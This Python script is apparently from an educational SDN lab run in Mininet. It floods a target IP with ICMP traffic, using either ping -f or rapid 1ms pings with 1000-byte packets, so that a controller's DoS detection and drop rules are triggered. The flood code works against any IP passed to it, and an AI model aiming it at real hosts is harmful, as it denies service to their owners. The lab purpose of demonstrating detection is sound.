#!/usr/bin/env python3
"""
Attack Traffic Generator (DoS Simulation)
==========================================
Generates high-rate flood traffic to simulate a Denial of Service attack.
This will trigger the SDN controller's detection and blocking logic.

Usage (run inside Mininet CLI):
    mininet> h3 python3 attack_traffic.py 10.0.0.1 &

Or standalone:
    python3 attack_traffic.py 10.0.0.1

WARNING: This is for educational demonstration only!
         Only use this in the Mininet simulated network.
"""

import subprocess
import sys
import time
import os


def launch_attack(target_ip, duration=30, method="ping_flood"):
    """
    Generate attack traffic to trigger SDN controller detection.

    Args:
        target_ip: Target IP address
        duration: Attack duration in seconds
        method: Attack method ('ping_flood' or 'rapid_ping')
    """
    hostname = os.popen("hostname").read().strip()

    print("!" * 60)
    print(f"  ⚡ ATTACK SIMULATION STARTED")
    print(f"  Attacker  : {hostname}")
    print(f"  Target    : {target_ip}")
    print(f"  Duration  : {duration}s")
    print(f"  Method    : {method}")
    print(f"  Rate      : HIGH (flood)")
    print("!" * 60)
    print()
    print("  ⚠️  This is for EDUCATIONAL PURPOSES only!")
    print("  ⚠️  Only use in Mininet simulated network!")
    print()

    start_time = time.time()

    try:
        if method == "ping_flood":
            # Method 1: ping flood (-f flag, requires root)
            # Sends pings as fast as possible
            print(f"  [ATTACK] Launching ping flood to {target_ip}...")
            print(f"  [ATTACK] The SDN controller should detect this")
            print(f"           within {5}-{10} seconds.\n")

            proc = subprocess.Popen(
                [
                    "ping",
                    "-f",           # Flood mode
                    "-s", "1000",   # Larger packet size (1000 bytes)
                    "-w", str(duration),  # Stop after duration
                    target_ip,
                ],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
            )

            # Print periodic status while attack runs
            while proc.poll() is None:
                elapsed = time.time() - start_time
                if elapsed >= duration:
                    proc.terminate()
                    break
                print(
                    f"  [ATTACK] Running... ({elapsed:.0f}s / {duration}s)",
                    end="\r",
                )
                time.sleep(1)

            print()  # Newline after \r updates

            # Print results
            stdout, stderr = proc.communicate(timeout=5)
            if stdout:
                # Extract statistics
                for line in stdout.split("\n"):
                    if "packets transmitted" in line or "packet loss" in line:
                        print(f"  [RESULT] {line.strip()}")
                    if "rtt" in line:
                        print(f"  [RESULT] {line.strip()}")

        elif method == "rapid_ping":
            # Method 2: Rapid ping (many pings with tiny interval)
            # Works without root, but slower than flood
            print(f"  [ATTACK] Launching rapid ping to {target_ip}...")
            print(f"  [ATTACK] Sending 1000 pings with 0.001s interval...\n")

            proc = subprocess.Popen(
                [
                    "ping",
                    "-c", "1000",        # 1000 pings
                    "-i", "0.001",       # 1ms interval (very fast)
                    "-s", "1000",        # 1000 byte packets
                    "-w", str(duration),
                    target_ip,
                ],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
            )

            while proc.poll() is None:
                elapsed = time.time() - start_time
                if elapsed >= duration:
                    proc.terminate()
                    break
                print(
                    f"  [ATTACK] Running... ({elapsed:.0f}s / {duration}s)",
                    end="\r",
                )
                time.sleep(1)

            print()
            stdout, stderr = proc.communicate(timeout=5)
            if stdout:
                for line in stdout.split("\n"):
                    if "packets transmitted" in line:
                        print(f"  [RESULT] {line.strip()}")

    except FileNotFoundError:
        print("  [ERROR] 'ping' command not found!")
    except KeyboardInterrupt:
        print("\n\n  [ATTACK] Stopped by user.")
    except Exception as e:
        print(f"\n  [ERROR] {e}")

    elapsed = time.time() - start_time
    print()
    print("=" * 60)
    print(f"  ATTACK SIMULATION ENDED after {elapsed:.1f}s")
    print("=" * 60)
    print()
    print("  Check the SDN controller terminal for detection alerts!")
    print("  The controller should have:")
    print("    1. Detected the high traffic rate")
    print("    2. Printed an ALERT message")
    print("    3. Installed DROP flow rules to block this host")
    print()


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 attack_traffic.py <target_ip> [duration] [method]")
        print("Example: python3 attack_traffic.py 10.0.0.1 30 ping_flood")
        print()
        print("Methods:")
        print("  ping_flood  - Uses ping -f (fastest, default)")
        print("  rapid_ping  - Uses ping with 1ms interval")
        sys.exit(1)

    target = sys.argv[1]
    dur = int(sys.argv[2]) if len(sys.argv) > 2 else 30
    meth = sys.argv[3] if len(sys.argv) > 3 else "ping_flood"

    launch_attack(target, duration=dur, method=meth)
